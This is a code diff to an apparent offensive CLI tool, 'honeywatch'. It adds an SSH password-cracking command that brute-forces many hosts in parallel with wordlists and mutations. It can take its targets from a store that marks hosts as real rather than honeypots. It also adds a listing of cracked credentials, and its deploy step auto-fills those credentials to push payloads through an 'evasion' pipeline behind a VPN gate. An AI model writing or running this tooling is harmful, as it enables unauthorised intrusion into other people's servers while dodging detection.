@@ -431,6 +431,126 @@ def build_parser() -> argparse.ArgumentParser:
     p_chat.add_argument("--config", default=None, help="path to a honeywatch TOML config")
     p_chat.set_defaults(func=_cmd_chat)
 
+    # ----------------------------- crack ---------------------------------
+    p_crack = sub.add_parser(
+        "crack",
+        help="online SSH password cracking against one or more hosts",
+    )
+    p_crack.add_argument(
+        "targets",
+        nargs="*",
+        metavar="HOST",
+        help="ip[:port] hosts to crack; use --target-file for a list",
+    )
+    p_crack.add_argument(
+        "--target-file",
+        default=None,
+        help="file with ip[:port] lines (one per line; # comments ok)",
+    )
+    p_crack.add_argument(
+        "--target-label",
+        choices=("real", "likely_real", "uncertain", "likely_honeypot", "honeypot"),
+        default=None,
+        help="pull targets from the store by final label instead of passing hosts",
+    )
+    p_crack.add_argument(
+        "--min-confidence",
+        type=float,
+        default=None,
+        help="minimum final confidence when pulling targets from the store",
+    )
+    p_crack.add_argument("--limit", type=int, default=None, help="max targets from the store")
+    p_crack.add_argument(
+        "--users",
+        default=None,
+        help="comma-separated usernames to try (default: built-in population)",
+    )
+    p_crack.add_argument(
+        "--user",
+        default=None,
+        help="single username to pin for all hosts (overrides --users)",
+    )
+    p_crack.add_argument(
+        "--wordlist",
+        default=None,
+        help="path to a newline-separated password wordlist",
+    )
+    p_crack.add_argument(
+        "--passwords",
+        default=None,
+        help="comma-separated passwords to try (bypasses wordlist/mutations)",
+    )
+    p_crack.add_argument(
+        "--no-mutations",
+        action="store_true",
+        help="try wordlist entries verbatim, without case/year/suffix mutations",
+    )
+    p_crack.add_argument(
+        "--concurrency",
+        type=int,
+        default=None,
+        help="parallel login attempts per host (default: from config)",
+    )
+    p_crack.add_argument(
+        "--host-concurrency",
+        type=int,
+        default=None,
+        help="max hosts attacked at once (default: from config)",
+    )
+    p_crack.add_argument(
+        "--timeout",
+        type=float,
+        default=None,
+        help="seconds per login attempt (default: from config)",
+    )
+    p_crack.add_argument(
+        "--max-attempts",
+        type=int,
+        default=None,
+        help="cap guesses per host before giving up (default: unbounded)",
+    )
+    p_crack.add_argument(
+        "--no-stop-on-success",
+        action="store_true",
+        help="keep trying after a success (coverage/audit mode)",
+    )
+    p_crack.add_argument(
+        "--no-save",
+        action="store_true",
+        help="do not persist cracked credentials to the store",
+    )
+    p_crack.add_argument(
+        "--json",
+        action="store_true",
+        help="emit results as a single JSON object",
+    )
+    p_crack.add_argument("--db", default=None, help="SQLite database path")
+    p_crack.add_argument(
+        "--skip-vpn-check",
+        action="store_true",
+        help="bypass the Mullvad VPN gate",
+    )
+    p_crack.add_argument("--config", default=None, help="path to a honeywatch TOML config")
+    p_crack.set_defaults(func=_cmd_crack)
+
+    # ----------------------------- creds ---------------------------------
+    p_creds = sub.add_parser(
+        "creds",
+        help="list cracked SSH credentials stored by `crack`",
+    )
+    p_creds.add_argument("--ip", default=None, help="filter by host ip")
+    p_creds.add_argument("--port", type=int, default=None, help="filter by port")
+    p_creds.add_argument("--user", default=None, help="filter by username")
+    p_creds.add_argument("--limit", type=int, default=100, help="max rows (default 100)")
+    p_creds.add_argument(
+        "--json",
+        action="store_true",
+        help="emit results as a JSON array",
+    )
+    p_creds.add_argument("--db", default=None, help="SQLite database path")
+    p_creds.add_argument("--config", default=None, help="path to a honeywatch TOML config")
+    p_creds.set_defaults(func=_cmd_creds)
+
     return parser
 
 
@@ -1048,6 +1168,22 @@ def _cmd_deploy(args, argv) -> int:
         print("deploy: no targets matched")
         return 0
 
+    # Auto-fill credentials the cracker previously stored for these hosts so
+    # `honeywatch crack` -> `honeywatch deploy ... --exec-mode ssh` works with
+    # no extra flags. Explicit --ssh-user/--ssh-key on the CLI still win.
+    if not args.ssh_user and not args.ssh_key:
+        cred_store = Store(db_path)
+        for target in targets:
+            if target.ssh_user and target.ssh_pass:
+                continue
+            cred = cred_store.credential_for(target.ip, target.port)
+            if not cred:
+                continue
+            if not target.ssh_user:
+                target.ssh_user = cred.get("user")
+            if not target.ssh_pass:
+                target.ssh_pass = cred.get("password")
+
     evasion = prepare_evasion_pipeline(args.evasion)
     if not evasion and not args.evasion:
         payloads_cfg = getattr(cfg, "payloads", None)
@@ -1145,6 +1281,175 @@ def _cmd_chat(args, argv) -> int:
             return 1
         return 0
     return ui.run()
+
+
+def _cmd_crack(args, argv) -> int:
+    import json as _json
+
+    from honeywatch.config import load_config
+    from honeywatch.crack import CrackTarget, crack_targets, load_wordlist
+    from honeywatch.store import Store
+
+    cfg = load_config(args.config)
+    if not _enforce_vpn(cfg, args.skip_vpn_check):
+        return 2
+
+    crack_cfg = getattr(cfg, "crack", None)
+    concurrency = args.concurrency or getattr(crack_cfg, "concurrency", 8)
+    host_concurrency = args.host_concurrency or getattr(crack_cfg, "host_concurrency", 32)
+    timeout_s = args.timeout if args.timeout is not None else getattr(crack_cfg, "timeout_s", 6.0)
+    max_attempts = (
+        args.max_attempts if args.max_attempts is not None
+        else getattr(crack_cfg, "max_attempts", None)
+    )
+    mutations = (not args.no_mutations) and bool(getattr(crack_cfg, "mutations", True))
+    save_credentials = (not args.no_save) and bool(getattr(crack_cfg, "save_credentials", True))
+
+    db_path = args.db or getattr(cfg.storage, "db", "honeywatch.db")
+    store = Store(db_path)
+
+    users: list[str] = []
+    if args.user:
+        users = [args.user]
+    elif args.users:
+        users = [u.strip() for u in args.users.split(",") if u.strip()]
+
+    passwords: list[str] = []
+    if args.passwords:
+        passwords = [p.strip() for p in args.passwords.split(",") if p.strip()]
+
+    wordlist: list[str] | None = None
+    if args.wordlist:
+        wordlist = load_wordlist(args.wordlist)
+        if not wordlist:
+            print(
+                "honeywatch: warning: wordlist " + repr(args.wordlist)
+                + " unreadable or empty; using built-ins only",
+                file=sys.stderr,
+            )
+
+    hosts: list[tuple[str, int]] = []
+    if args.targets:
+        for spec in args.targets:
+            ip, port = parse_host(spec)
+            hosts.append((ip, port))
+    if args.target_file:
+        with open(args.target_file, "r", encoding="utf-8") as fh:
+            for line in fh:
+                line = line.strip()
+                if not line or line.startswith("#"):
+                    continue
+                ip, port = parse_host(line)
+                hosts.append((ip, port))
+    if not hosts and (args.target_label or args.min_confidence is not None):
+        rows = store.query(
+            limit=args.limit or 1000,
+            label=args.target_label,
+            min_confidence=args.min_confidence or 0.0,
+        )
+        for row in rows:
+            hosts.append((row["ip"], int(row["port"])))
+    if not hosts:
+        print("crack: no targets. Pass hosts, --target-file, or --target-label/--min-confidence.")
+        return 0
+
+    seen: set[tuple[str, int]] = set()
+    unique_hosts: list[tuple[str, int]] = []
+    for ip, port in hosts:
+        key = (ip, port)
+        if key not in seen:
+            seen.add(key)
+            unique_hosts.append(key)
+    hosts = unique_hosts
+
+    targets = [
+        CrackTarget(
+            ip=ip,
+            port=port,
+            users=list(users),
+            passwords=list(passwords),
+            wordlist=wordlist,
+            mutations=mutations,
+            max_attempts=max_attempts,
+            timeout_s=timeout_s,
+            stop_on_success=not args.no_stop_on_success,
+        )
+        for ip, port in hosts
+    ]
+
+    print(
+        "cracking " + str(len(targets)) + " host(s): concurrency=" + str(concurrency)
+        + "/host host_concurrency=" + str(host_concurrency) + " timeout=" + str(timeout_s) + "s"
+    )
+
+    def on_attempt(attempt, result):
+        mark = "+" if attempt.success else "-"
+        if not args.json:
+            masked = "*" * len(attempt.password)
+            print("  [" + mark + "] " + result.ip + ":" + str(result.port)
+                  + " " + attempt.user + ":" + masked, flush=True)
+
+    results = _maybe_await(
+        crack_targets(
+            targets,
+            concurrency=concurrency,
+            host_concurrency=host_concurrency,
+            on_attempt=on_attempt,
+        )
+    )
+
+    if save_credentials:
+        for res in results:
+            if res.success:
+                store.upsert_credential(
+                    res.ip, res.port, res.user or "", res.password,
+                    banner=res.banner, attempts=res.attempts, source="crack",
+                )
+
+    if args.json:
+        print(_json.dumps([r.credential() for r in results], indent=2, default=str))
+        return 0
+
+    wins = [r for r in results if r.success]
+    print("\ncrack summary")
+    print("  hosts:      " + str(len(results)))
+    print("  successes:  " + str(len(wins)))
+    print("  attempts:   " + str(sum(r.attempts for r in results)))
+    if wins:
+        print("\ncredentials:")
+        for r in wins:
+            print("  " + r.ip + ":" + str(r.port) + "  " + str(r.user) + ":" + str(r.password))
+    else:
+        print("\nno credentials recovered.")
+    return 0
+
+
+def _cmd_creds(args, argv) -> int:
+    import json as _json
+
+    from honeywatch.config import load_config
+    from honeywatch.store import Store
+
+    cfg = load_config(args.config)
+    db_path = args.db or getattr(cfg.storage, "db", "honeywatch.db")
+    store = Store(db_path)
+    rows = store.query_credentials(
+        ip=args.ip, port=args.port, user=args.user, limit=args.limit
+    )
+    if args.json:
+        print(_json.dumps(rows, indent=2, default=str))
+        return 0
+    if not rows:
+        print("no stored credentials.")
+        return 0
+    print("{:<28} {:<14} {:<24} {:<9} {}".format(
+        "host", "user", "password", "attempts", "discovered"))
+    for r in rows:
+        host = str(r.get("ip")) + ":" + str(r.get("port"))
+        print("{:<28} {:<14} {:<24} {:<9} {}".format(
+            host, r.get("user") or "", r.get("password") or "",
+            r.get("attempts", 0), r.get("discovered_at") or ""))
+    return 0
 
 
 def print_summary(scores) -> None:
